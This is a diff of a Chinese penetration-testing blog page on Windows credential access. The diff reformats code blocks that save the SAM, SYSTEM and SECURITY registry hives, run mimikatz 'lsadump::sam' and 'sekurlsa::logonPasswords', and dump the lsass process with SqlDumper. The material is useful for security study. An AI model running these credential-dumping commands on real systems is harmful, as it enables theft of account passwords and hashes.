@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16240fa3725939b7b0af06">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112">
-<meta property="og:updated_time" content="2019-06-28T14:45:46.000Z">
+<meta property="og:updated_time" content="2019-06-28T14:48:50.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【域渗透】Credential Access Dumping">
 <meta name="twitter:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。 SAM(Security Accounts Manager)windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam  0x01 注册表1234567Reg从注册表提取SAM：reg save HKLM\SYSTEM sys.">
@@ -155,7 +155,7 @@
 <h3 id="0x01-注册表"><a href="#0x01-注册表" class="headerlink" title="0x01 注册表"></a>0x01 注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Reg从注册表提取SAM：</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save hklm\security security.hiv</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d16217aa3725939b7b0a288" alt=""></p>
 <p>接着拉回本地机器 (很多环境下，不允许上传或者使用mimikatz。而针对非域控的单机离线提取hash显得尤为重要。) 接着用 mimikatz 加载这两个文件正常读取即可。</p>
-<p><code># mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure>
 <p>  <img src="https://www.yunzhijia.com/microblog/filesvr/5d1621c028011f4ba7fc9ded" alt=""></p>
 <p>同时也可以使用impacket套件中的secretsdump.py脚本进行解密。</p>
 <p>仓库地址：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p>
@@ -179,10 +179,10 @@
 <p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d1623cea3725939b7b0ad96" alt=""></p>
 <p><code># tasklist | findstr &quot;lsass.exe&quot; 先找到 lsass.exe 进程 id</code></p>
 <p>使用用法：</p>
-<p>SqlDumper <process id="" (pid)=""> <thread id="" (tid)=""> &lt;Flags:Minidump Flags&gt; <sqlinfoptr> <dump directory=""></dump></sqlinfoptr></thread></process></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlDumper &lt;process id (PID)&gt; &lt;thread id (TID)&gt; &lt;Flags:Minidump Flags&gt; &lt;SQLInfoPtr&gt; &lt;Dump Directory&gt;</span><br></pre></td></tr></table></figure>
 <p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16240fa3725939b7b0af06" alt=""></p>
 <p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41" alt=""></p>
-<p><code># mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
 <p>如下：</p>
 <p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112" alt=""></p>
 
